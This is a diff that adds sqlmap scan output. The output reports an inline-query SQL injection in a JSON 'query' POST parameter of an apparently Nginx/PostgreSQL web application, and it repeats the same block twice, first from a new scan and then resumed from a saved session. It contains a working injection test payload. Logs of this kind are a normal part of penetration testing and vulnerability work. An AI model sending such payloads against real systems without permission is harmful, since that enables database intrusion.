@@ -1,0 +1,18 @@
+sqlmap identified the following injection point(s) with a total of 403 HTTP(s) requests:
+---
+Parameter: JSON query ((custom) POST)
+    Type: inline query
+    Title: Generic inline queries
+    Payload: {"query":"(SELECT CONCAT(CONCAT('qvbpq',(CASE WHEN (8618=8618) THEN '1' ELSE '0' END)),'qxpzq'))"}
+---
+web application technology: Nginx 1.27.5
+back-end DBMS: PostgreSQL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON query ((custom) POST)
+    Type: inline query
+    Title: Generic inline queries
+    Payload: {"query":"(SELECT CONCAT(CONCAT('qvbpq',(CASE WHEN (8618=8618) THEN '1' ELSE '0' END)),'qxpzq'))"}
+---
+web application technology: Nginx 1.27.5
+back-end DBMS: PostgreSQL
